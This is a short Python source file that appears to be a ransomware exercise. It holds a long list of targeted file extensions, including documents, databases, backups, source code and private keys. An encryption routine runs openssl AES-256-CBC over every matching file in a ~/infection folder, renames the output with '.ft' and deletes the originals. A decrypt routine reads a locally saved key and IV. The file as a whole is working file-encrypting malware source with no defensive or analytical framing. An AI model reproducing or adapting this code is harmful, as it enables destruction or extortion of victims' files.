import secrets
import subprocess
import os, sys

_TARGET_EXTENSIONS_=(
        "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pst", "ost", "msg", "eml", "vsd", "vsdx",
    "txt", "csv", "rtf", "123", "wks", "wk1", "pdf", "dwg", "onetoc2", "snt", "hwp", "602",
    "sxi", "sti", "sldx", "sldm", "sldm", "vdi", "vmdk", "vmx", "gpg", "aes", "ARC", "PAQ",
    "bz2", "tbk", "bak", "tar", "tgz", "gz", "7z", "rar", "zip", "backup", "iso", "vcd",
    "jpeg", "jpg", "bmp", "png", "gif", "raw", "cgm", "tif", "tiff", "nef", "psd", "ai",
    "svg", "djvu", "m4u", "m3u", "mid", "wma", "flv", "3g2", "mkv", "3gp", "mp4", "mov",
    "avi", "asf", "mpeg", "vob", "mpg", "wmv", "fla", "swf", "wav", "mp3", "sh", "class",
    "jar", "java", "rb", "asp", "php", "jsp", "brd", "sch", "dch", "dip", "pl", "vb", "vbs",
    "ps1", "bat", "cmd", "js", "asm", "h", "pas", "cpp", "c", "cs", "suo", "sln", "ldf",
    "mdf", "ibd", "myi", "myd", "frm", "odb", "dbf", "db", "mdb", "accdb", "sql", "sqlitedb",
    "sqlite3", "asc", "lay6", "lay", "mml", "sxm", "otg", "odg", "uop", "std", "sxd", "otp",
    "odp", "wb2", "slk", "dif", "stc", "sxc", "ots", "ods", "3dm", "max", "3ds", "uot", "stw",
    "sxw", "ott", "odt", "pem", "p12", "csr", "crt", "key", "pfx", "der"
)


def encryptionssl(args):
    key = secrets.token_hex(32)  # 32 bytes = 256 bits for AES-256
    iv = secrets.token_hex(16)   # 16 bytes = 128 bits for IV

    with open("key.txt", "w") as f:
        f.write(key)
    with open("iv.txt", "w") as f:
        f.write(iv)

    folder = os.path.expanduser("~/infection")
    for filename in os.listdir(folder):
        if filename.lower().endswith(_TARGET_EXTENSIONS_):
            filepath = os.path.join(folder, filename)
        else:
            continue
        if os.path.isfile(filepath):
            encrypted_path = filepath + ".ft"
            subprocess.run([
                "openssl", "enc", "-aes-256-cbc", "-K", key, "-iv", iv,
                "-in", filepath, "-out", encrypted_path
            ])
            if not args.silent:
                print("Encrypted file:", filepath,  )
            os.remove(filepath)

def decryptssl(args):
# Decrypt
    folder = os.path.expanduser("~/infection")
    with open("key.txt") as f:
        key = f.read().strip()
    with open("iv.txt") as f:
        iv = f.read().strip()
    for filename in os.listdir(folder):
        if filename.endswith(".ft"):
            encrypted_path = os.path.join(folder, filename)
            decrypted_path = encrypted_path[:-3]  # remove '.ft'
            subprocess.run([
                "openssl", "enc", "-d", "-aes-256-cbc", "-K", key, "-iv", iv,
                "-in", encrypted_path, "-out", decrypted_path
            ])
            if not args.silent:
                print("decrypted file: ",filename)
            os.remove(encrypted_path)